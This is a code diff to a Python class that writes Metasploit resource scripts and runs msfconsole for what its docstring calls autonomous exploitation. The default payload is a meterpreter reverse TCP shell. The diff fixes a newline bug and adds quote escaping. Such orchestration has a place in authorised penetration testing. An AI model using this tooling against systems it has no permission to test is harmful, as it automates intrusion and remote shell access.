@@ -100,13 +100,18 @@ class MetasploitOrchestrator:
     def __init__(self, bridge):
         self.bridge = bridge
 
-    def build_resource_script(self, rhosts, module, lhost, lport=4444, payload="linux/x64/meterpreter/reverse_tcp", extra_options=None):
+    def build_resource_script(self, rhosts, module, lhost, lport=4444,
+                               payload="linux/x64/meterpreter/reverse_tcp",
+                               extra_options=None):
         """
         Builds a .rc script for autonomous exploitation.
+        BUG FIXED: was using '\\n'.join() which produced literal backslash-n text
+        in the script file, making every msfconsole run read the entire operation
+        as one invalid line. Now writes proper newlines via printf.
         """
         script_id = str(uuid.uuid4())[:8]
         filepath = f"/tmp/autopwn_{script_id}.rc"
-        
+
         lines = [
             f"use {module}",
             f"set RHOSTS {rhosts}",
@@ -114,20 +119,21 @@ class MetasploitOrchestrator:
             f"set LPORT {lport}",
             f"set PAYLOAD {payload}"
         ]
-        
+
         if extra_options:
             for k, v in extra_options.items():
                 lines.append(f"set {k} {v}")
-                
+
         lines.append("run")
         lines.append("exit")
-        
-        # We use a command to write this since we are orchestrating WSL/Linux
-        # If the backend is running directly on Kali, we could write via python
-        content = "\\n".join(lines)
-        cmd = f"python3 -c \"print('{content}')\" > {filepath}"
+
+        # Write the .rc file with real newlines.
+        # Escape single-quotes to prevent shell injection.
+        content = "\n".join(lines)
+        safe_content = content.replace("'", "'\"'\"'")
+        cmd = f"printf '%s\\n' '{safe_content}' > {filepath}"
         self.bridge.execute_command(cmd)
-        
+
         return filepath
 
     def execute_script(self, script_path):
@@ -136,3 +142,4 @@ class MetasploitOrchestrator:
         """
         cmd = f"msfconsole -q -r {script_path}"
         return self.bridge.execute_command(cmd, timeout=300)
+
